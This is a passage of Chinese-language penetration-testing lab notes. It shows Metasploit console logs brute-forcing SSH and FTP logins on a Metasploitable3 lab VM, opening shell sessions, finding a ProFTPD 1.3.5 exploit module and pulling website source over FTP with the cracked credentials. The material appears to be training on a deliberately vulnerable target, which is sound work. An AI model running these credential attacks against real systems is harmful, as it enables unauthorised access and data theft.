+[+] 192.168.101.180:22 - Success: 'vagrant:vagrant' 'uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 1 opened (192.168.101.53:32933 -> 192.168.101.180:22) at 2025-02-17 13:01:09 +0800
+
+
+
+
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type         Information  Connection
+  --  ----  ----         -----------  ----------
+  1         shell linux  SSH root @   192.168.101.53:32933 -> 192.168.101.180:22 (192.
+                                      168.101.180)
+
+msf6 auxiliary(scanner/ssh/ssh_login) > session -K
+[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -K
+[*] Killing all sessions...
+[*] 192.168.101.180 - SSH session 1 closed.
+msf6 auxiliary(scanner/ssh/ssh_login) > set Verbose true
+Verbose => true
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.101.180:22 - Starting bruteforce
+[-] 192.168.101.180:22 - Failed: 'root:'
+[-] 192.168.101.180:22 - Failed: 'root:!root'
+[-] 192.168.101.180:22 - Failed: 'root:Cisco'
+[-] 192.168.101.180:22 - Failed: 'root:NeXT'
+[-] 192.168.101.180:22 - Failed: 'root:QNX'
+[-] 192.168.101.180:22 - Failed: 'root:admin'
+[-] 192.168.101.180:22 - Failed: 'root:attack'
+[-] 192.168.101.180:22 - Failed: 'root:ax400'
+[+] 192.168.101.180:22 - Success: 'vagrant:vagrant' 'uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 2 opened (192.168.101.53:46027 -> 192.168.101.180:22) at 2025-02-17 13:02:52 +0800
+[-] 192.168.101.180:22 - Failed: 'root:123456'
+[-] 192.168.101.180:22 - Failed: 'root:bagabu'
+[-] 192.168.101.180:22 - Failed: 'root:blablabla'
+[-] 192.168.101.180:22 - Failed: 'root:blender'
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
+stop_on_success => true
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.101.180:22 - Starting bruteforce
+[-] 192.168.101.180:22 - Failed: 'root:'
+[-] 192.168.101.180:22 - Failed: 'root:!root'
+[-] 192.168.101.180:22 - Failed: 'root:Cisco'
+[-] 192.168.101.180:22 - Failed: 'root:NeXT'
+[-] 192.168.101.180:22 - Failed: 'root:QNX'
+[-] 192.168.101.180:22 - Failed: 'root:admin'
+[-] 192.168.101.180:22 - Failed: 'root:attack'
+[-] 192.168.101.180:22 - Failed: 'root:ax400'
+[+] 192.168.101.180:22 - Success: 'vagrant:vagrant' 'uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 3 opened (192.168.101.53:45759 -> 192.168.101.180:22) at 2025-02-17 13:03:46 +0800
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type         Information  Connection
+  --  ----  ----         -----------  ----------
+  2         shell linux  SSH root @   192.168.101.53:46027 -> 192.168.101.180:22 (192.
+                                      168.101.180)
+  3         shell linux  SSH root @   192.168.101.53:45759 -> 192.168.101.180:22 (192.
+                                      168.101.180)
+
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 3
+[*] Starting interaction with 3...
+
+^C
+Abort session 3? [y/N]  y   
+
+[*] 192.168.101.180 - SSH session 3 closed.  Reason: User exit
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type         Information  Connection
+  --  ----  ----         -----------  ----------
+  2         shell linux  SSH root @   192.168.101.53:46027 -> 192.168.101.180:22 (192.
+                                      168.101.180)
+
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 2
+[*] Starting interaction with 2...
+
+pwd
+/home/vagrant
+
+就可以连上了
+
+
+之后我们看看基于FTP协议的收集信息
+先查看ftp服务的版本地址
+msf6 > search ftp_version
+
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank    Check  Description
+   -  ----                               ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ftp/ftp_version  .                normal  No     FTP Version Scanner
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ftp/ftp_version                                                                     
+
+msf6 > use 0
+msf6 auxiliary(scanner/ftp/ftp_version) > options
+
+Module options (auxiliary/scanner/ftp/ftp_version):
+
+   Name     Current Setting      Required  Description
+   ----     ---------------      --------  -----------
+   FTPPASS  mozilla@example.com  no        The password for the specified username
+   FTPUSER  anonymous            no        The username to authenticate as
+   RHOSTS                        yes       The target host(s), see https://docs.metasp
+                                           loit.com/docs/using-metasploit/basics/using
+                                           -metasploit.html
+   RPORT    21                   yes       The target port (TCP)
+   THREADS  1                    yes       The number of concurrent threads (max one p
+                                           er host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.101.180
+RHOSTS => 192.168.101.180
+msf6 auxiliary(scanner/ftp/ftp_version) > run
+
+[+] 192.168.101.180:21    - FTP Banner: '220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.101.180]\x0d\x0a'
+[*] 192.168.101.180:21    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+得到的版本是ProFTPD 1.3.5
+exp就是漏洞利用 我们找一下能用的组件啥的
+msf6 auxiliary(scanner/ftp/ftp_version) > search ProFTPD 1.3.5
+
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/proftpd_modcopy_exec  2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution                                                        
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_modcopy_exec                                                                 
+
+msf6 auxiliary(scanner/ftp/ftp_version) > 
+
+
+然后咱们进行一些ftp匿名登录扫描
+有的人会见ftp根目录绑定到网站根目录或者其他目录
+而且有的ftp服务有的开启了匿名登陆 绑定到了一个目录(不一定是根目录)
+一般是只读权限
+msf6 >  use auxiliary/scanner/ftp/anonymous
+msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.101.180
+RHOSTS => 192.168.101.180
+msf6 auxiliary(scanner/ftp/anonymous) > run
+
+[+] 192.168.101.180:21    - 192.168.101.180:21 - Anonymous READ (220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.101.180])
+[*] 192.168.101.180:21    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+发现Anonymous READ 说明存在只读匿名登陆
+
+我们就可以直接在终端
+┌──(root💀tyza66)-[~]
+└─# lftp 192.168.101.180            
+lftp 192.168.101.180:~> 
+
+直接就可以访问
+记得关闭被动模式
+┌──(root💀tyza66)-[~]
+└─# lftp 192.168.101.180            
+lftp 192.168.101.180:~> ls
+drwxrwxrwx   2 0        0            4096 Aug 17  2024 upload
+lftp 192.168.101.180:/> 
+
+接下来试一下ftp暴力破解
+先加一点字典内容
+之后去扫
+msf6 > use auxiliary/scanner/ftp/ftp_login
+msf6 auxiliary(scanner/ftp/ftp_login) > show options
+
+Module options (auxiliary/scanner/ftp/ftp_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username
+                                                 and password
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored i
+                                                n the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current datab
+                                                ase to the list
+   DB_ALL_USERS      false            no        Add all users in the current database
+                                                to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in th
+                                                e current database (Accepted: none, us
+                                                er, user&realm)
+   PASSWORD                           no        A specific password to authenticate wi
+                                                th
+   PASS_FILE                          no        File containing passwords, one per lin
+                                                e
+   Proxies                            no        A proxy chain of format type:host:port
+                                                [,type:host:port][...]
+   RECORD_GUEST      false            no        Record anonymous/guest logins to the d
+                                                atabase
+   RHOSTS                             yes       The target host(s), see https://docs.m
+                                                etasploit.com/docs/using-metasploit/ba
+                                                sics/using-metasploit.html
+   RPORT             21               yes       The target port (TCP)
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works
+                                                for a host
+   THREADS           1                yes       The number of concurrent threads (max
+                                                one per host)
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords se
+                                                parated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for a
+                                                ll users
+   USER_FILE                          no        File containing usernames, one per lin
+                                                e
+   VERBOSE           true             yes       Whether to print output for all attemp
+                                                ts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.101.180
+RHOSTS => 192.168.101.180
+msf6 auxiliary(scanner/ftp/ftp_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+msf6 auxiliary(scanner/ftp/ftp_login) > run
+
+[*] 192.168.101.180:21    - 192.168.101.180:21 - Starting FTP login sweep
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root: (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:!root (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:Cisco (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:NeXT (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:QNX (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:admin (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:attack (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:ax400 (Incorrect: )
+[+] 192.168.101.180:21    - 192.168.101.180:21 - Login Successful: vagrant:vagrant
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:123456 (Incorrect: )
+[+] 192.168.101.180:21    - 192.168.101.180:21 - Login Successful: msfadmin:msfadmin
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:bagabu (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:blablabla (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:blender (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:brightmail (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:calvin (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:changeme (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:changethis (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:default (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:fibranne (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:honey (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:jstwo (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:kn1TG7psLu (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:letacla (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:mpegvideo (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:nsi (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:par0t (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:pass (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:password (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:pixmet2003 (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:resumix (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:root (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:rootme (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:rootpass (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:t00lk1t (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:tini (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:toor (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:trendimsa1.0 (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:tslinux (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:uClinux (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:vertex25 (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:owaspbwa (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:permit (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:ascend (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:ROOT500 (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:cms500 (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:fivranne (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:davox (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:letmein (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:powerapp (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:dbps (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:ibm (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:monitor (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:turnkey (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:vagrant (Incorrect: )
+[*] 192.168.101.180:21    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+发现了两个有效账密
+
+如果设置了跑到密码就停止那就只能发现一个账密
+msf6 auxiliary(scanner/ftp/ftp_login) > set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+msf6 auxiliary(scanner/ftp/ftp_login) > run
+
+[*] 192.168.101.180:21    - 192.168.101.180:21 - Starting FTP login sweep
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root: (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:!root (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:Cisco (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:NeXT (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:QNX (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:admin (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:attack (Incorrect: )
+[-] 192.168.101.180:21    - 192.168.101.180:21 - LOGIN FAILED: root:ax400 (Incorrect: )
+[+] 192.168.101.180:21    - 192.168.101.180:21 - Login Successful: vagrant:vagrant
+[*] 192.168.101.180:21    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+之后我们可以用lftp连一下这两个账户看看
+┌──(root💀tyza66)-[~]
+└─# lftp 192.168.101.180 -u msfadmin
+密码: 
+lftp msfadmin@192.168.101.180:~> ls                   
+-rw-r--r--   1 33       33          58875 Jul 27  2011 CHANGELOG.txt
+-rw-r--r--   1 33       33            996 Jul 27  2011 COPYRIGHT.txt
+-rw-r--r--   1 33       33           1447 Jul 27  2011 INSTALL.mysql.txt
+-rw-r--r--   1 33       33           1874 Jul 27  2011 INSTALL.pgsql.txt
+-rw-r--r--   1 33       33           1298 Jul 27  2011 INSTALL.sqlite.txt
+-rw-r--r--   1 33       33          17856 Jul 27  2011 INSTALL.txt
+-rw-r--r--   1 33       33          14940 Feb 24  2011 LICENSE.txt
+-rw-r--r--   1 33       33           7356 Jul 27  2011 MAINTAINERS.txt
+-rw-r--r--   1 33       33           3494 Jul 27  2011 README.txt
+-rw-r--r--   1 33       33           8811 Jul 27  2011 UPGRADE.txt
+-rw-r--r--   1 33       33           6605 Jul 27  2011 authorize.php
+-rw-r--r--   1 33       33            720 Jul 27  2011 cron.php
+drwxr-xr-x   4 33       33           4096 Jul 27  2011 includes
+-rw-r--r--   1 33       33            529 Jul 27  2011 index.php
+-rw-r--r--   1 33       33            688 Jul 27  2011 install.php
+drwxr-xr-x   4 33       33           4096 Jul 27  2011 misc
+drwxr-xr-x  42 33       33           4096 Jul 27  2011 modules
+drwxr-xr-x   5 33       33           4096 Jul 27  2011 profiles
+-rw-r--r--   1 33       33           1531 Jul 27  2011 robots.txt
+drwxr-xr-x   2 33       33           4096 Jul 27  2011 scripts
+drwxr-xr-x   4 33       33           4096 Jul 27  2011 sites
+drwxr-xr-x   8 33       33           4096 Jul 27  2011 themes
+-rw-r--r--   1 33       33          18039 Jul 27  2011 update.php
+-rw-r--r--   1 33       33           2051 Jul 27  2011 web.config
+-rw-r--r--   1 33       33            417 Jul 27  2011 xmlrpc.php
+
+直接拿到了网站的源码
+lftp msfadmin@192.168.101.180:/> lftp 192.168.101.180 -u vagrant
+密码: 
+lftp vagrant@192.168.101.180:~> ls
+-rw-r--r--   1 33       33          58875 Jul 27  2011 CHANGELOG.txt
+-rw-r--r--   1 33       33            996 Jul 27  2011 COPYRIGHT.txt
+-rw-r--r--   1 33       33           1447 Jul 27  2011 INSTALL.mysql.txt
+-rw-r--r--   1 33       33           1874 Jul 27  2011 INSTALL.pgsql.txt
+-rw-r--r--   1 33       33           1298 Jul 27  2011 INSTALL.sqlite.txt
+-rw-r--r--   1 33       33          17856 Jul 27  2011 INSTALL.txt
+-rw-r--r--   1 33       33          14940 Feb 24  2011 LICENSE.txt
+-rw-r--r--   1 33       33           7356 Jul 27  2011 MAINTAINERS.txt
+-rw-r--r--   1 33       33           3494 Jul 27  2011 README.txt
+-rw-r--r--   1 33       33           8811 Jul 27  2011 UPGRADE.txt
+-rw-r--r--   1 33       33           6605 Jul 27  2011 authorize.php
+-rw-r--r--   1 33       33            720 Jul 27  2011 cron.php
+drwxr-xr-x   4 33       33           4096 Jul 27  2011 includes
+-rw-r--r--   1 33       33            529 Jul 27  2011 index.php
+-rw-r--r--   1 33       33            688 Jul 27  2011 install.php
+drwxr-xr-x   4 33       33           4096 Jul 27  2011 misc
+drwxr-xr-x  42 33       33           4096 Jul 27  2011 modules
+drwxr-xr-x   5 33       33           4096 Jul 27  2011 profiles
+-rw-r--r--   1 33       33           1531 Jul 27  2011 robots.txt
+drwxr-xr-x   2 33       33           4096 Jul 27  2011 scripts
+drwxr-xr-x   4 33       33           4096 Jul 27  2011 sites
+drwxr-xr-x   8 33       33           4096 Jul 27  2011 themes
+-rw-r--r--   1 33       33          18039 Jul 27  2011 update.php
+-rw-r--r--   1 33       33           2051 Jul 27  2011 web.config
+-rw-r--r--   1 33       33            417 Jul 27  2011 xmlrpc.php
 
 
 
